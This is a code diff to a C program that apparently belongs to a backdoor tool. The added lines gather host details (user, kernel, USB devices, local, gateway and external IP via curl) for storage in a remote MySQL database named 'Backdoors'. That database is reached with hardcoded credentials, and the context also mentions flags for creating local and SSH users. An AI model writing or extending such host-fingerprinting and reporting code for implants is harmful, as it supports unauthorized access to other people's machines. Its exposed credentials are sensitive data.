@@ -310,16 +310,24 @@ int main()
 	char Username[33] = "";
 	popenretrieve(Username, "whoami", sizeof(Username));
 	//printf("%s",Username);
-	char KernelRelease[21] = "";
+	char KernelRelease[51] = "";
 	popenretrieve(KernelRelease, "uname -r", sizeof(KernelRelease));
 	//printf("%s",KernelRelease);
-	char TimeRun[20] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
+	char TimeRun[24] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
+	popenretrieve(TimeRun, "date +'%F %T'", sizeof(TimeRun));
+	//printf("%s",TimeRun);
 	char lsusb[101] = "";
 	popenretrieve(lsusb, "lsusb", sizeof(lsusb));
 	//printf("%s",lsusb);
 	char LocalIP[16] = "";
+	popenretrieve(LocalIP, "hostname -l", sizeof(LocalIP));
+	//printf("%s",LocalIP);
 	char ExternalIP[16] = "";
+	popenretrieve(ExternalIP, "curl ifconfig.me -s", sizeof(ExternalIP));
+	//printf("%s",ExternalIP);
 	char GatewayIP[16] = "";
+	popenretrieve(GatewayIP, "ip r | awk 'NR==1{ print $3}'", sizeof(GatewayIP));
+	//printf("%s",GatewayIP);
 	char NewLocalUser[2] = "";
 	char SSHserver[2] = "";
 	char NewSSHuser[2] = "";
@@ -333,7 +341,7 @@ int main()
 	char *user = "Farrington";
 	char *password = "ClaySiltSand";
 	char *database = "Backdoors";
-	char prepairedStatement [16600] = "";
+	char prepairedStatement [16638] = "";
  
 	//Making the connection to the database
 	if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0))
